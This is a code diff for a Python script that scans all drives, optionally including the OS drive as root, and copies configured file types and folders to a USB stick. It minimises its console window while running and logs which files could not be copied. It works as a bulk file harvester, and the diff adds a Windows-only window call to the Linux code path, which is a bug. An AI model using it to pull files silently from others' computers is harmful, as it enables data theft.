@@ -7,6 +7,7 @@ from os import walk, chdir, listdir, sep, path, makedirs
 
 class MainWindows:
     def __init__(self):
+        self.Log = []
         filess = listdir('.')
         if "types.txt" in filess :
             file = open('types.txt')
@@ -14,7 +15,9 @@ class MainWindows:
             listertype = reader[0].replace(" , ", '').replace(" ,", ",").replace(", ", ",").replace("type=", "").lower().split(",")
             listerfile = reader[1].replace(" , ", '').replace(" ,", ",").replace(", ", ",").replace("file=", "").lower().split(",")
             listerfolder = reader[2].replace(" , ", '').replace(" ,", ",").replace(", ", ",").replace("folder=","").lower().split(",")
-            reader[3] = reader[3].replace(" ", "").replace("\n", "").lower().replace("search_OS_drive=", "")
+            reader[3] = reader[3].replace(" ", "").replace("\n", "").replace("search_OS_drive=", "").lower()
+
+            # print(reader)
 
             listertypes = []
             x = 0
@@ -100,16 +103,20 @@ class MainWindows:
                     self.drive_list.remove(i)
 ## endregion
 
-        self.counter = 0
-        for driver in self.drive_list:
-            self.copier(driver)
-
-    def copier(self,driver):
-        self.Log = []
         #region AutoMinimize
         import ctypes
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
         #endregion
+        self.counter = 0
+        for driver in self.drive_list:
+            self.copier(driver)
+
+    def structure(self):
+        structure = "\n==========Search==========\nSearched for these folders    : "+str(self.folders) +"\nSearched for these file-types : "+str(self.types) +"\nSearched for these files      : "+ str(self.file) + "\nAnd search os drive(folders)  : " + self.oser.replace("-os","").lower()
+        return structure.replace("\'","").replace("[","").replace("]","")
+
+    def copier(self,driver):
+
         chdir(driver)
 
         files = self.file
@@ -138,7 +145,7 @@ class MainWindows:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location,self.dest + absulpath + filename + time + types[types.index(type)])
                                     except:
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     # print(main_location)
                                     self.counter += 1
                                     # print(counter)
@@ -149,7 +156,7 @@ class MainWindows:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location, self.dest +absulpath+ filename)
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     # print(counter)
                                     stdout.write('\r' +str(self.counter))
@@ -175,7 +182,7 @@ class MainWindows:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location,self.dest + absulpath + filename + time + files[files.index(file)])
                                     except:
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     # print(main_location)
                                     self.counter += 1
                                     # print(counter)
@@ -186,7 +193,7 @@ class MainWindows:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location, self.dest + absulpath + filename)
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     # print(counter)
                                     stdout.write('\r' + str(self.counter))
@@ -212,7 +219,7 @@ class MainWindows:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copytree(main_location,self.dest + absulpath + dir + time + folder[folder.index(fold)])
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     stdout.write('\r' + str(self.counter))
 
@@ -221,7 +228,7 @@ class MainWindows:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copytree(main_location, self.dest + absulpath + dir)
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     # print(counter)
                                     stdout.write('\r' + str(self.counter))
@@ -229,6 +236,7 @@ class MainWindows:
 
 class MainLinux:
     def __init__(self):
+        self.Log = []
         self.username = getuser()
         filess = listdir('.')
         if "types.txt" in filess:
@@ -237,7 +245,7 @@ class MainLinux:
             listertype = reader[0].replace(" , ",'').replace(" ,",",").replace(", " ,",").replace("type=", "").lower().split(",")
             listerfile = reader[1].replace(" , ",'').replace(" ,",",").replace(", " ,",").replace("file=", "").lower().split(",")
             listerfolder = reader[2].replace(" , ",'').replace(" ,",",").replace(", " ,",").replace("folder=", "").lower().split(",")
-            reader[3] = reader[3].replace(" ","").replace("\n","").lower().replace("search_OS_drive=","")
+            reader[3] = reader[3].replace(" ", "").replace("\n", "").replace("search_OS_drive=", "").lower()
 
             listertypes = []
             x = 0
@@ -269,7 +277,7 @@ class MainLinux:
             if reader[3] == "yes":
                 self.oser = "Yes-os"
                 if getuid() != 0:
-                    print("Run the srcipt with root user , or change "+ '\033[1m' + "search_OS_drive " + "in types.txt to" + "\033[1m"+ " no")
+                    print("Run the script with root user , or change "+ '\033[1m' + "search_OS_drive " + "in types.txt to" + "\033[1m"+ " no")
                     sleep(4)
                     exit()
                 else:
@@ -309,6 +317,10 @@ class MainLinux:
 ## endregion
 
         self.counter = 0
+        #region AutoMinimize
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
+        #endregion
         for driver in self.drive_list:
             if driver != "/" :
                 if driver.replace(sep,"") in listdir("/"):
@@ -316,12 +328,12 @@ class MainLinux:
             else:
                 self.copier(driver)
 
+    def structure(self):
+        structure = "\n==========Search==========\nSearched for these folders    : "+str(self.folders) +"\nSearched for these file-types : "+str(self.types) +"\nSearched for these files      : "+ str(self.file) + "\nAnd search os drive(folders)  : " + self.oser.replace("-os","").lower()
+        return structure.replace("\'","").replace("[","").replace("]","")
+
     def copier(self,driver):
-        self.Log = []
-        #region AutoMinimize
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
-        #endregion
+
         chdir(driver)
 
         files = self.file
@@ -342,18 +354,17 @@ class MainLinux:
 
                                 absulpath = path.abspath(main_location).replace(":","")
                                 absulpath = absulpath[:absulpath.rfind(sep)] + sep
-                                # print(absulpath)
 
                                 if filename in listdir(self.dest):
                                     filename = filename.replace(types[types.index(type)],"")
                                     try:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location, self.dest + absulpath+ filename + time +types[types.index(type)])
-                                    except :
-                                        self.Log.append(main_location)
-                                    # print(main_location)
+                                    except:
+                                        self.Log.append(driver + main_location[2:])
+
                                     self.counter += 1
-                                    # print(counter)
+
                                     stdout.write('\r'+str(self.counter))
 
                                 else:
@@ -361,9 +372,12 @@ class MainLinux:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location, self.dest +absulpath+ filename)
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
+                                    # finally:
+                                    #     print("shit")
+                                    #     if filename not in self.dest+absulpath:
+                                    #         self.Log.append(main_location)
                                     self.counter += 1
-                                    # print(counter)
                                     stdout.write('\r' +str(self.counter))
 
                 if files != [] :
@@ -387,7 +401,7 @@ class MainLinux:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location,self.dest + absulpath + filename + time + files[files.index(file)])
                                     except:
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     # print(main_location)
                                     self.counter += 1
                                     # print(counter)
@@ -398,7 +412,7 @@ class MainLinux:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copyfile(main_location, self.dest + absulpath + filename)
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     # print(counter)
                                     stdout.write('\r' + str(self.counter))
@@ -424,7 +438,7 @@ class MainLinux:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copytree(main_location,self.dest + absulpath + dir + time + folder[folder.index(fold)])
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     stdout.write('\r' + str(self.counter))
 
@@ -433,7 +447,7 @@ class MainLinux:
                                         makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                         copytree(main_location, self.dest + absulpath + dir)
                                     except :
-                                        self.Log.append(main_location)
+                                        self.Log.append(driver + main_location[2:])
                                     self.counter += 1
                                     # print(counter)
                                     stdout.write('\r' + str(self.counter))
@@ -451,10 +465,25 @@ if __name__ == "__main__":
         M = MainWindows()
         M.usb_finder()
         M.drives()
-        
-        if M.Log != []:
-            log = open(M.dest+"Log.txt","w",encoding="utf-8")
-            log.writelines(M.Log)
+
+        #region log
+        if M.Log == []:
+            log1 = open(M.dest+"Log.txt","w",encoding="utf-8")
+            log1.write("#####All files(folders) copied#####\n")
+            log1.close()
+            log = open(M.dest+"Log.txt","a",encoding="utf-8")
+            log.write(M.structure())
+            log.close()
+        if len(M.Log) > 0:
+            log1 = open(M.dest+"Log.txt","w",encoding="utf-8")
+            log1.write("=====Couldn't copy these files or folders=====\n\n")
+            log1.close()
+            log = open(M.dest+"Log.txt","a",encoding="utf-8")
+            for Log in M.Log:
+                log.write(Log + "\n")
+            log.write(M.structure())
+            log.close()
+        #endregion
         print(".")
 
 
@@ -468,7 +497,22 @@ if __name__ == "__main__":
         M.usb_finder()
         M.drives()
 
-        if M.Log != []:
-            log = open(M.dest+"Log.txt","w",encoding="utf-8")
-            log.writelines(M.Log)
+        #region log
+        if M.Log == []:
+            log1 = open(M.dest+"Log.txt","w",encoding="utf-8")
+            log1.write("#####All files(folders) copied#####\n")
+            log1.close()
+            log = open(M.dest+"Log.txt","a",encoding="utf-8")
+            log.write(M.structure())
+            log.close()
+        if len(M.Log) > 0:
+            log1 = open(M.dest+"Log.txt","w",encoding="utf-8")
+            log1.write("=====Couldn't copy these files or folders=====\n\n")
+            log1.close()
+            log = open(M.dest+"Log.txt","a",encoding="utf-8")
+            for Log in M.Log:
+                log.write(Log + "\n")
+            log.write(M.structure())
+            log.close()
+        #endregion
         print(".")
